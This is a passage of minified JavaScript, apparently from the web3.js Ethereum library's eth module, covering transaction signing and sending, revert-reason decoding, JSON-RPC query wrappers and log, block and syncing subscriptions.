        if (e instanceof Ud && !Array.isArray((s = e.cause) === null || s === void 0 ? void 0 : s.errors) && e.cause !== void 0) return e.cause.message;
        throw e
    };

    function r2(e, t, n, r = e.defaultReturnFormat) {
        return yO(this, void 0, void 0, function*() {
            try {
                yield gg(e, t, e.defaultBlock, r);
                return
            } catch (i) {
                return wO(i, n)
            }
        })
    }
    var bO = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };

    function fh(e, t, n, r, i, o) {
        return bO(this, void 0, void 0, function*() {
            let s = o;
            s === void 0 && e.handleRevert && t !== void 0 && (s = yield r2(e, t, i));
            let a;
            if (s === void 0) a = new jx(n);
            else if (typeof s == "string") a = new Iu(s, void 0, n);
            else if (s.customErrorName !== void 0 && s.customErrorDecodedSignature !== void 0 && s.customErrorArguments !== void 0) {
                const l = s;
                a = new Dx(l.reason, l.customErrorName, l.customErrorDecodedSignature, l.customErrorArguments, l.signature, n, l.data)
            } else a = new Iu(s.reason, s.signature, n, s.data);
            return a
        })
    }
    const hg = (e, t, n, r = At) => {
        var i, o, s, a, l;
        let u = Object.assign({}, e);
        const c = D(zs, t, r);
        if ([Ts, "allEvents"].includes(u.name)) {
            const f = n.find(h => h.signature === t.topics[0]);
            f ? u = f : u = {
                anonymous: !0
            }
        }
        if (u.inputs = (o = (i = u.inputs) !== null && i !== void 0 ? i : e.inputs) !== null && o !== void 0 ? o : [], !u.anonymous) {
            let f = 0;
            ((s = u.inputs) !== null && s !== void 0 ? s : []).forEach(h => {
                h.indexed && (f += 1)
            }), f > 0 && (t != null && t.topics) && (t == null ? void 0 : t.topics.length) !== f + 1 && (u = Object.assign(Object.assign({}, u), {
                anonymous: !0,
                inputs: []
            }))
        }
        const d = u.anonymous ? t.topics : ((a = t.topics) !== null && a !== void 0 ? a : []).slice(1);
        return Object.assign(Object.assign({}, c), {
            returnValues: n2([...(l = u.inputs) !== null && l !== void 0 ? l : []], t.data, d),
            event: u.name,
            signature: u.anonymous || !t.topics || t.topics.length === 0 || !t.topics[0] ? void 0 : t.topics[0],
            raw: {
                data: t.data,
                topics: t.topics
            }
        })
    };
    var bi = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    class i2 {
        constructor({
            options: t,
            web3Context: n,
            promiEvent: r,
            returnFormat: i
        }) {
            this.options = {
                checkRevertBeforeSending: !0
            }, this.options = t, this.web3Context = n, this.promiEvent = r, this.returnFormat = i
        }
        getReceiptWithEvents(t) {
            var n, r;
            const i = Object.assign({}, t ?? {});
            if (!((n = this.options) === null || n === void 0) && n.contractAbi && i.logs && i.logs.length > 0) {
                i.events = {};
                for (const o of i.logs) {
                    const s = hg(Gp, o, (r = this.options) === null || r === void 0 ? void 0 : r.contractAbi, this.returnFormat);
                    s.event && (i.events[s.event] = s)
                }
            }
            return i
        }
        checkRevertBeforeSending(t) {
            return bi(this, void 0, void 0, function*() {
                if (this.options.checkRevertBeforeSending !== !1) {
                    let n = t;
                    N(t.data) && N(t.input) && N(t.gas) && (n = Object.assign(Object.assign({}, t), {
                        gas: 21e3
                    }));
                    const r = yield r2(this.web3Context, n, this.options.contractAbi);
                    if (r !== void 0) throw yield fh(this.web3Context, t, void 0, void 0, this.options.contractAbi, r)
                }
            })
        }
        emitSending(t) {
            this.promiEvent.listenerCount("sending") > 0 && this.promiEvent.emit("sending", t)
        }
        populateGasPrice({
            transactionFormatted: t,
            transaction: n
        }) {
            var r;
            return bi(this, void 0, void 0, function*() {
                let i = t;
                return !this.web3Context.config.ignoreGasPricing && !(!((r = this.options) === null || r === void 0) && r.ignoreGasPricing) && N(t.gasPrice) && (N(n.maxPriorityFeePerGas) || N(n.maxFeePerGas)) && (i = Object.assign(Object.assign({}, t), yield RA(t, this.web3Context, oe))), i
            })
        }
        signAndSend({
            wallet: t,
            tx: n
        }) {
            return bi(this, void 0, void 0, function*() {
                if (t) {
                    const r = yield t.signTransaction(n);
                    return qp(this.web3Context, () => bi(this, void 0, void 0, function*() {
                        return SA(this.web3Context.requestManager, r.rawTransaction)
                    }), r.transactionHash)
                }
                return qp(this.web3Context, () => bi(this, void 0, void 0, function*() {
                    return kB(this.web3Context.requestManager, n)
                }))
            })
        }
        emitSent(t) {
            this.promiEvent.listenerCount("sent") > 0 && this.promiEvent.emit("sent", t)
        }
        emitTransactionHash(t) {
            this.promiEvent.listenerCount("transactionHash") > 0 && this.promiEvent.emit("transactionHash", t)
        }
        emitReceipt(t) {
            this.promiEvent.listenerCount("receipt") > 0 && this.promiEvent.emit("receipt", t)
        }
        handleError({
            error: t,
            tx: n
        }) {
            var r;
            return bi(this, void 0, void 0, function*() {
                let i = t;
                return i instanceof Gi && this.web3Context.handleRevert && (i = yield fh(this.web3Context, n, void 0, void 0, (r = this.options) === null || r === void 0 ? void 0 : r.contractAbi)), (i instanceof Ud || i instanceof Gi || i instanceof Dx || i instanceof jx || i instanceof Iu || i instanceof zx) && this.promiEvent.listenerCount("error") > 0 && this.promiEvent.emit("error", i), i
            })
        }
        emitConfirmation({
            receipt: t,
            transactionHash: n,
            customTransactionReceiptSchema: r
        }) {
            this.promiEvent.listenerCount("confirmation") > 0 && MM(this.web3Context, this.promiEvent, t, n, this.returnFormat, r)
        }
        handleResolve({
            receipt: t,
            tx: n
        }) {
            var r, i, o;
            return bi(this, void 0, void 0, function*() {
                if (!((r = this.options) === null || r === void 0) && r.transactionResolver) return (i = this.options) === null || i === void 0 ? void 0 : i.transactionResolver(t);
                if (t.status === BigInt(0)) {
                    const s = yield fh(this.web3Context, n, t, void 0, (o = this.options) === null || o === void 0 ? void 0 : o.contractAbi);
                    throw this.promiEvent.listenerCount("error") > 0 && this.promiEvent.emit("error", s), s
                } else return t
            })
        }
    }
    var we = function(e, t, n, r) {
            function i(o) {
                return o instanceof n ? o : new n(function(s) {
                    s(o)
                })
            }
            return new(n || (n = Promise))(function(o, s) {
                function a(c) {
                    try {
                        u(r.next(c))
                    } catch (d) {
                        s(d)
                    }
                }

                function l(c) {
                    try {
                        u(r.throw(c))
                    } catch (d) {
                        s(d)
                    }
                }

                function u(c) {
                    c.done ? o(c.value) : i(c.value).then(a, l)
                }
                u((r = r.apply(e, t || [])).next())
            })
        },
        xO = function(e, t) {
            var n = {};
            for (var r in e) Object.prototype.hasOwnProperty.call(e, r) && t.indexOf(r) < 0 && (n[r] = e[r]);
            if (e != null && typeof Object.getOwnPropertySymbols == "function")
                for (var i = 0, r = Object.getOwnPropertySymbols(e); i < r.length; i++) t.indexOf(r[i]) < 0 && Object.prototype.propertyIsEnumerable.call(e, r[i]) && (n[r[i]] = e[r[i]]);
            return n
        };
    const EO = e => we(void 0, void 0, void 0, function*() {
        return _A(e.requestManager)
    });

    function AO(e, t) {
        return we(this, void 0, void 0, function*() {
            const n = yield dB(e.requestManager);
            return D({
                format: "uint"
            }, n, t ?? e.defaultReturnFormat)
        })
    }

    function pg(e, t) {
        return we(this, void 0, void 0, function*() {
            const n = yield fB(e.requestManager);
            return D({
                format: "uint"
            }, n, t ?? e.defaultReturnFormat)
        })
    }

    function _O(e, t) {
        return we(this, void 0, void 0, function*() {
            const n = yield hB(e.requestManager);
            return D({
                format: "uint"
            }, n, t ?? e.defaultReturnFormat)
        })
    }

    function mg(e, t) {
        return we(this, void 0, void 0, function*() {
            const n = yield mB(e.requestManager);
            return D({
                format: "uint"
            }, n, t ?? e.defaultReturnFormat)
        })
    }

    function SO(e, t, n = e.defaultBlock, r) {
        return we(this, void 0, void 0, function*() {
            const i = tt(n) ? n : D({
                    format: "uint"
                }, n, oe),
                o = yield gB(e.requestManager, t, i);
            return D({
                format: "uint"
            }, o, r ?? e.defaultReturnFormat)
        })
    }

    function kO(e, t, n, r = e.defaultBlock, i) {
        return we(this, void 0, void 0, function*() {
            const o = D({
                    format: "uint"
                }, n, oe),
                s = tt(r) ? r : D({
                    format: "uint"
                }, r, oe),
                a = yield vB(e.requestManager, t, o, s);
            return D({
                format: "bytes"
            }, a, i ?? e.defaultReturnFormat)
        })
    }

    function TO(e, t, n = e.defaultBlock, r) {
        return we(this, void 0, void 0, function*() {
            const i = tt(n) ? n : D({
                    format: "uint"
                }, n, oe),
                o = yield AB(e.requestManager, t, i);
            return D({
                format: "bytes"
            }, o, r ?? e.defaultReturnFormat)
        })
    }

    function o2(e, t = e.defaultBlock, n = !1, r) {
        var i;
        return we(this, void 0, void 0, function*() {
            let o;
            if (gi(t)) {
                const a = D({
                    format: "bytes32"
                }, t, oe);
                o = yield CB(e.requestManager, a, n)
            } else {
                const a = tt(t) ? t : D({
                    format: "uint"
                }, t, oe);
                o = yield kA(e.requestManager, a, n)
            }
            const s = D(Ju, o, r ?? e.defaultReturnFormat);
            return N(s) ? s : Object.assign(Object.assign({}, s), {
                transactions: (i = s.transactions) !== null && i !== void 0 ? i : []
            })
        })
    }

    function IO(e, t = e.defaultBlock, n) {
        return we(this, void 0, void 0, function*() {
            let r;
            if (gi(t)) {
                const i = D({
                    format: "bytes32"
                }, t, oe);
                r = yield wB(e.requestManager, i)
            } else {
                const i = tt(t) ? t : D({
                    format: "uint"
                }, t, oe);
                r = yield bB(e.requestManager, i)
            }
            return D({
                format: "uint"
            }, r, n ?? e.defaultReturnFormat)
        })
    }

    function CO(e, t = e.defaultBlock, n) {
        return we(this, void 0, void 0, function*() {
            let r;
            if (gi(t)) {
                const i = D({
                    format: "bytes32"
                }, t, oe);
                r = yield xB(e.requestManager, i)
            } else {
                const i = tt(t) ? t : D({
                    format: "uint"
                }, t, oe);
                r = yield EB(e.requestManager, i)
            }
            return D({
                format: "uint"
            }, r, n ?? e.defaultReturnFormat)
        })
    }

    function PO(e, t = e.defaultBlock, n, r) {
        return we(this, void 0, void 0, function*() {
            const i = D({
                format: "uint"
            }, n, oe);
            let o;
            if (gi(t)) {
                const s = D({
                    format: "bytes32"
                }, t, oe);
                o = yield MB(e.requestManager, s, i)
            } else {
                const s = tt(t) ? t : D({
                    format: "uint"
                }, t, oe);
                o = yield OB(e.requestManager, s, i)
            }
            return D(Ju, o, r ?? e.defaultReturnFormat)
        })
    }

    function RO(e, t, n = e.defaultReturnFormat) {
        return we(this, void 0, void 0, function*() {
            const r = D({
                    format: "bytes32"
                }, t, At),
                i = yield PB(e.requestManager, r);
            return N(i) ? i : Ht(i, n, {
                transactionSchema: e.config.customTransactionSchema,
                fillInputAndData: !0
            })
        })
    }

    function NO(e, t) {
        return we(this, void 0, void 0, function*() {
            return (yield WB(e.requestManager)).map(r => Ht(r, t ?? e.defaultReturnFormat, {
                transactionSchema: e.config.customTransactionSchema,
                fillInputAndData: !0
            }))
        })
    }

    function BO(e, t = e.defaultBlock, n, r) {
        return we(this, void 0, void 0, function*() {
            const i = D({
                format: "uint"
            }, n, oe);
            let o;
            if (gi(t)) {
                const s = D({
                    format: "bytes32"
                }, t, oe);
                o = yield RB(e.requestManager, s, i)
            } else {
                const s = tt(t) ? t : D({
                    format: "uint"
                }, t, oe);
                o = yield NB(e.requestManager, s, i)
            }
            return N(o) ? o : Ht(o, r ?? e.defaultReturnFormat, {
                transactionSchema: e.config.customTransactionSchema,
                fillInputAndData: !0
            })
        })
    }

    function s2(e, t, n) {
        return we(this, void 0, void 0, function*() {
            const r = D({
                format: "bytes32"
            }, t, At);
            let i;
            try {
                i = yield BB(e.requestManager, r)
            } catch (o) {
                if (typeof o == "object" && !N(o) && "message" in o && o.message === "transaction indexing is in progress") console.warn("Transaction indexing is in progress.");
                else throw o
            }
            return N(i) ? i : D(Gs, i, n ?? e.defaultReturnFormat)
        })
    }

    function a2(e, t, n = e.defaultBlock, r) {
        return we(this, void 0, void 0, function*() {
            const i = tt(n) ? n : D({
                    format: "uint"
                }, n, oe),
                o = yield yB(e.requestManager, t, i);
            return D({
                format: "uint"
            }, o, r ?? e.defaultReturnFormat)
        })
    }

    function Al(e, t, n, r = {
        checkRevertBeforeSending: !0
    }, i) {
        const o = new AA((s, a) => {
            setImmediate(() => {
                we(this, void 0, void 0, function*() {
                    const l = new i2({
                        web3Context: e,
                        promiEvent: o,
                        options: r,
                        returnFormat: n
                    });
                    let u = Object.assign({}, t);
                    N(i) || (u = yield i.processTransaction(u));
                    let c = Ht(Object.assign(Object.assign({}, u), {
                        from: Vp("from", e, u),
                        to: Vp("to", e, u)
                    }), oe, {
                        transactionSchema: e.config.customTransactionSchema
                    });
                    try {
                        c = yield l.populateGasPrice({
                            transaction: u,
                            transactionFormatted: c
                        }), yield l.checkRevertBeforeSending(c), l.emitSending(c);
                        let d;
                        e.wallet && !N(c.from) && (d = e.wallet.get(c.from));
                        const f = yield l.signAndSend({
                            wallet: d,
                            tx: c
                        }), h = D({
                            format: "bytes32"
                        }, f, n ?? e.defaultReturnFormat);
                        l.emitSent(c), l.emitTransactionHash(h);
                        const v = yield MA(e, f, n ?? e.defaultReturnFormat), p = l.getReceiptWithEvents(D(Gs, v, n ?? e.defaultReturnFormat));
                        l.emitReceipt(p), s(yield l.handleResolve({
                            receipt: p,
                            tx: c
                        })), l.emitConfirmation({
                            receipt: p,
                            transactionHash: f
                        })
                    } catch (d) {
                        a(yield l.handleError({
                            error: d,
                            tx: c
                        }))
                    }
                })
            })
        });
        return o
    }

    function MO(e, t, n, r = {
        checkRevertBeforeSending: !0
    }) {
        const i = new AA((o, s) => {
            setImmediate(() => {
                we(this, void 0, void 0, function*() {
                    const a = new i2({
                            web3Context: e,
                            promiEvent: i,
                            options: r,
                            returnFormat: n
                        }),
                        l = D({
                            format: "bytes"
                        }, t, oe),
                        u = po.fromSerializedData(Zn(ke(l))),
                        c = Object.assign(Object.assign({}, u.toJSON()), {
                            from: u.getSenderAddress().toString()
                        });
                    try {
                        const {
                            v: d,
                            r: f,
                            s: h
                        } = c, v = xO(c, ["v", "r", "s"]);
                        yield a.checkRevertBeforeSending(v), a.emitSending(l);
                        const p = yield qp(e, () => we(this, void 0, void 0, function*() {
                            return SA(e.requestManager, l)
                        }));
                        a.emitSent(l);
                        const w = D({
                            format: "bytes32"
                        }, p, n ?? e.defaultReturnFormat);
                        a.emitTransactionHash(w);
                        const m = yield MA(e, p, n ?? e.defaultReturnFormat), g = a.getReceiptWithEvents(D(Gs, m, n ?? e.defaultReturnFormat));
                        a.emitReceipt(g), o(yield a.handleResolve({
                            receipt: g,
                            tx: c
                        })), a.emitConfirmation({
                            receipt: g,
                            transactionHash: p
                        })
                    } catch (d) {
                        s(yield a.handleError({
                            error: d,
                            tx: c
                        }))
                    }
                })
            })
        });
        return i
    }

    function OO(e, t, n, r = e.defaultReturnFormat) {
        var i;
        return we(this, void 0, void 0, function*() {
            const o = D({
                format: "bytes"
            }, t, At);
            if (!((i = e.wallet) === null || i === void 0) && i.get(n)) {
                const l = e.wallet.get(n).sign(o);
                return D(wM, l, r)
            }
            if (typeof n == "number") throw new j4(t, 'RPC method "eth_sign" does not support index signatures');
            const s = yield _B(e.requestManager, n, o);
            return D({
                format: "bytes"
            }, s, r)
        })
    }

    function LO(e, t, n = e.defaultReturnFormat) {
        return we(this, void 0, void 0, function*() {
            const r = yield SB(e.requestManager, Ht(t, oe, {
                transactionSchema: e.config.customTransactionSchema
            }));
            return I0(r) ? AM(r, n, {
                fillInputAndData: !0
            }) : {
                raw: D({
                    format: "bytes"
                }, r.raw, n),
                tx: Ht(r.tx, n, {
                    transactionSchema: e.config.customTransactionSchema,
                    fillInputAndData: !0
                })
            }
        })
    }

    function gg(e, t, n = e.defaultBlock, r = e.defaultReturnFormat) {
        return we(this, void 0, void 0, function*() {
            const i = tt(n) ? n : D({
                    format: "uint"
                }, n, oe),
                o = yield TB(e.requestManager, Ht(t, oe, {
                    transactionSchema: e.config.customTransactionSchema
                }), i);
            return D({
                format: "bytes"
            }, o, r)
        })
    }

    function vg(e, t, n = e.defaultBlock, r) {
        return we(this, void 0, void 0, function*() {
            const i = Ht(t, oe, {
                    transactionSchema: e.config.customTransactionSchema
                }),
                o = tt(n) ? n : D({
                    format: "uint"
                }, n, oe),
                s = yield IB(e.requestManager, i, o);
            return D({
                format: "uint"
            }, s, r ?? e.defaultReturnFormat)
        })
    }

    function l2(e, t, n) {
        return we(this, void 0, void 0, function*() {
            let {
                toBlock: r,
                fromBlock: i
            } = t;
            N(r) || (typeof r == "number" || typeof r == "bigint") && (r = Ze(r)), N(i) || (typeof i == "number" || typeof i == "bigint") && (i = Ze(i));
            const o = Object.assign(Object.assign({}, t), {
                fromBlock: i,
                toBlock: r
            });
            return (yield UB(e.requestManager, o)).map(l => typeof l == "string" ? l : D(zs, l, n ?? e.defaultReturnFormat))
        })
    }

    function c2(e, t) {
        return we(this, void 0, void 0, function*() {
            const n = yield QB(e.requestManager);
            return D({
                format: "uint"
            }, n, t ?? e.defaultReturnFormat)
        })
    }

    function FO(e, t, n, r = e.defaultBlock, i) {
        return we(this, void 0, void 0, function*() {
            const o = n.map(l => D({
                    format: "bytes"
                }, l, oe)),
                s = tt(r) ? r : D({
                    format: "uint"
                }, r, oe),
                a = yield KB(e.requestManager, t, o, s);
            return D(EM, a, i ?? e.defaultReturnFormat)
        })
    }

    function DO(e, t, n = e.defaultBlock, r, i) {
        return we(this, void 0, void 0, function*() {
            const o = D({
                    format: "uint"
                }, t, oe),
                s = tt(n) ? n : D({
                    format: "uint"
                }, n, oe),
                a = D({
                    type: "array",
                    items: {
                        format: "uint"
                    }
                }, r, af),
                l = yield VB(e.requestManager, o, s, a);
            return D(bM, l, i ?? e.defaultReturnFormat)
        })
    }

    function u2(e, t, n = e.defaultBlock, r) {
        return we(this, void 0, void 0, function*() {
            const i = tt(n) ? n : D({
                    format: "uint"
                }, n, oe),
                o = yield YB(e.requestManager, Ht(t, oe, {
                    transactionSchema: e.config.customTransactionSchema
                }), i);
            return D(mM, o, r ?? e.defaultReturnFormat)
        })
    }

    function jO(e, t, n, r, i) {
        return we(this, void 0, void 0, function*() {
            const o = yield JB(e.requestManager, t, n, r);
            return D({
                format: "bytes"
            }, o, i ?? e.defaultReturnFormat)
        })
    }
    var Vs = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };

    function HO(e, t) {
        return Vs(this, void 0, void 0, function*() {
            const n = yield DB(e.requestManager);
            return D({
                format: "uint"
            }, n, t ?? e.defaultReturnFormat)
        })
    }

    function $O(e, t, n) {
        return Vs(this, void 0, void 0, function*() {
            let {
                toBlock: r,
                fromBlock: i
            } = t;
            N(r) || (typeof r == "number" || typeof r == "bigint") && (r = Ze(r)), N(i) || (typeof i == "number" || typeof i == "bigint") && (i = Ze(i));
            const o = Object.assign(Object.assign({}, t), {
                    fromBlock: i,
                    toBlock: r
                }),
                s = yield LB(e.requestManager, o);
            return D({
                format: "uint"
            }, s, n ?? e.defaultReturnFormat)
        })
    }

    function UO(e, t) {
        return Vs(this, void 0, void 0, function*() {
            const n = yield FB(e.requestManager);
            return D({
                format: "uint"
            }, n, t ?? e.defaultReturnFormat)
        })
    }

    function zO(e, t) {
        return Vs(this, void 0, void 0, function*() {
            return yield jB(e.requestManager, Ze(t))
        })
    }

    function GO(e, t, n) {
        return Vs(this, void 0, void 0, function*() {
            return (yield HB(e.requestManager, Ze(t))).map(o => typeof o == "string" ? o : D(zs, o, n ?? e.defaultReturnFormat))
        })
    }

    function VO(e, t, n) {
        return Vs(this, void 0, void 0, function*() {
            return (yield $B(e.requestManager, Ze(t))).map(o => typeof o == "string" ? o : D(zs, o, n ?? e.defaultReturnFormat))
        })
    }
    class d2 extends Vl {
        _buildSubscriptionParams() {
            return ["logs", this.args]
        }
        formatSubscriptionResult(t) {
            return D(zs, t, super.returnFormat)
        }
    }
    class e1 extends Vl {
        _buildSubscriptionParams() {
            return ["newPendingTransactions"]
        }
        formatSubscriptionResult(t) {
            return D({
                format: "string"
            }, t, super.returnFormat)
        }
    }
    class nd extends Vl {
        _buildSubscriptionParams() {
            return ["newHeads"]
        }
        formatSubscriptionResult(t) {
            return D(vM, t, super.returnFormat)
        }
    }
    class f2 extends Vl {
        _buildSubscriptionParams() {
            return ["syncing"]
        }
        _processSubscriptionResult(t) {
            if (typeof t == "boolean") this.emit("changed", t);
            else {
                const n = Object.fromEntries(Object.entries((t == null ? void 0 : t.status) || t).map(([r, i]) => [r.charAt(0).toLowerCase() + r.substring(1), i]));
                this.emit("changed", t.syncing), this.emit("data", D(yM, n, super.returnFormat))
            }
        }
    }
    var se = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    const Xp = {
        logs: d2,
        newPendingTransactions: e1,
        newHeads: nd,
        syncing: f2,
        pendingTransactions: e1,
        newBlockHeaders: nd
    };
    class df extends Lt {
        constructor(t) {
            if (typeof t == "string" || Wu(t)) {
                super({
                    provider: t,
                    registeredSubscriptions: Xp
                });
                return
            }
            if (t.registeredSubscriptions) {
                super(t);
                return
            }
            super(Object.assign(Object.assign({}, t), {
                registeredSubscriptions: Xp
            })), this.getFeeData = this.calculateFeeData
        }
        setTransactionMiddleware(t) {
            this.transactionMiddleware = t
        }
        getTransactionMiddleware() {
            return this.transactionMiddleware
        }
        getProtocolVersion() {
            return se(this, void 0, void 0, function*() {
                return lB(this.requestManager)
            })
        }
        isSyncing() {
            return se(this, void 0, void 0, function*() {
                return _A(this.requestManager)
            })
        }
        getCoinbase() {
            return se(this, void 0, void 0, function*() {
                return cB(this.requestManager)
            })
        }
        isMining() {
            return se(this, void 0, void 0, function*() {
                return uB(this.requestManager)
            })
        }
        getHashrate(t) {
            var n;
            return t === void 0 && (t = (n = this.defaultReturnFormat) !== null && n !== void 0 ? n : At), se(this, void 0, void 0, function*() {
                return this.getHashRate(t)
            })
        }
        getHashRate(t = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return AO(this, t)
            })
        }
        getGasPrice(t = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return pg(this, t)
            })
        }
        getMaxPriorityFeePerGas(t = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return _O(this, t)
            })
        }
        calculateFeeData(t = BigInt(2), n = Kd.Gwei) {
            var r;
            return se(this, void 0, void 0, function*() {
                const i = yield this.getBlock(void 0, !1), o = (r = i == null ? void 0 : i.baseFeePerGas) !== null && r !== void 0 ? r : void 0;
                let s;
                try {
                    s = yield this.getGasPrice()
                } catch {}
                let a;
                try {
                    a = yield this.getMaxPriorityFeePerGas()
                } catch {}
                let l;
                if (o) {
                    a = a ?? n;
                    let u;
                    typeof t == "number" ? u = BigInt(Math.floor(t * 1e3)) / BigInt(1e3) : u = t, l = o * u + a
                }
                return {
                    gasPrice: s,
                    maxFeePerGas: l,
                    maxPriorityFeePerGas: a,
                    baseFeePerGas: o
                }
            })
        }
        getAccounts() {
            var t;
            return se(this, void 0, void 0, function*() {
                return ((t = yield pB(this.requestManager)) !== null && t !== void 0 ? t : []).map(r => Xn(r))
            })
        }
        getBlockNumber(t = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return mg(this, t)
            })
        }
        getBalance(t, n = this.defaultBlock, r = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return SO(this, t, n, r)
            })
        }
        getStorageAt(t, n, r = this.defaultBlock, i = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return kO(this, t, n, r, i)
            })
        }
        getCode(t, n = this.defaultBlock, r = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return TO(this, t, n, r)
            })
        }
        getBlock(t = this.defaultBlock, n = !1, r = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return o2(this, t, n, r)
            })
        }
        getBlockTransactionCount(t = this.defaultBlock, n = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return IO(this, t, n)
            })
        }
        getBlockUncleCount(t = this.defaultBlock, n = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return CO(this, t, n)
            })
        }
        getUncle(t = this.defaultBlock, n, r = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return PO(this, t, n, r)
            })
        }
        getTransaction(t, n = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                const r = yield RO(this, t, n);
                if (!r) throw new cy;
                return r
            })
        }
        getPendingTransactions(t = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return NO(this, t)
            })
        }
        getTransactionFromBlock(t = this.defaultBlock, n, r = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return BO(this, t, n, r)
            })
        }
        getTransactionReceipt(t, n = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                const r = yield s2(this, t, n);
                if (!r) throw new cy;
                return r
            })
        }
        getTransactionCount(t, n = this.defaultBlock, r = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return a2(this, t, n, r)
            })
        }
        sendTransaction(t, n = this.defaultReturnFormat, r) {
            return Al(this, t, n, r, this.transactionMiddleware)
        }
        sendSignedTransaction(t, n = this.defaultReturnFormat, r) {
            return MO(this, t, n, r)
        }
        sign(t, n, r = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return OO(this, t, n, r)
            })
        }
        signTransaction(t, n = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return LO(this, t, n)
            })
        }
        call(t, n = this.defaultBlock, r = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return gg(this, t, n, r)
            })
        }
        estimateGas(t, n = this.defaultBlock, r = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return vg(this, t, n, r)
            })
        }
        getPastLogs(t, n = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return l2(this, t, n)
            })
        }
        getWork() {
            return se(this, void 0, void 0, function*() {
                return zB(this.requestManager)
            })
        }
        submitWork(t, n, r) {
            return se(this, void 0, void 0, function*() {
                return GB(this.requestManager, t, n, r)
            })
        }
        requestAccounts() {
            return se(this, void 0, void 0, function*() {
                return qB(this.requestManager)
            })
        }
        getChainId(t = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return c2(this, t)
            })
        }
        getNodeInfo() {
            return se(this, void 0, void 0, function*() {
                return ZB(this.requestManager)
            })
        }
        getProof(t, n, r = this.defaultBlock, i = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return FO(this, t, n, r, i)
            })
        }
        getFeeHistory(t, n = this.defaultBlock, r, i = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return DO(this, t, n, r, i)
            })
        }
        createAccessList(t, n = this.defaultBlock, r = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return u2(this, t, n, r)
            })
        }
        signTypedData(t, n, r, i) {
            var o;
            return r === void 0 && (r = !1), i === void 0 && (i = (o = this.defaultReturnFormat) !== null && o !== void 0 ? o : At), se(this, void 0, void 0, function*() {
                return jO(this, t, n, r, i)
            })
        }
        subscribe(t, n, r) {
            var i, o;
            return r === void 0 && (r = (i = this.defaultReturnFormat) !== null && i !== void 0 ? i : At), se(this, void 0, void 0, function*() {
                const s = yield(o = this.subscriptionManager) === null || o === void 0 ? void 0 : o.subscribe(t, n, r);
                return s instanceof d2 && t === "logs" && typeof n == "object" && !X(n.fromBlock) && Number.isFinite(Number(n.fromBlock)) && setImmediate(() => {
                    this.getPastLogs(n).then(a => {
                        for (const l of a) s._processSubscriptionResult(l)
                    }).catch(a => {
                        s._processSubscriptionError(a)
                    })
                }), s
            })
        }
        static shouldClearSubscription({
            sub: t
        }) {
            return !(t instanceof f2)
        }
        clearSubscriptions(t = !1) {
            var n;
            return (n = this.subscriptionManager) === null || n === void 0 ? void 0 : n.unsubscribe(t ? df.shouldClearSubscription : void 0)
        }
        createNewPendingTransactionFilter(t = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return HO(this, t)
            })
        }
        createNewFilter(t, n = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return $O(this, t, n)
            })
        }
        createNewBlockFilter(t = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return UO(this, t)
            })
        }
        uninstallFilter(t) {
            return se(this, void 0, void 0, function*() {
                return zO(this, t)
            })
        }
        getFilterChanges(t, n = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
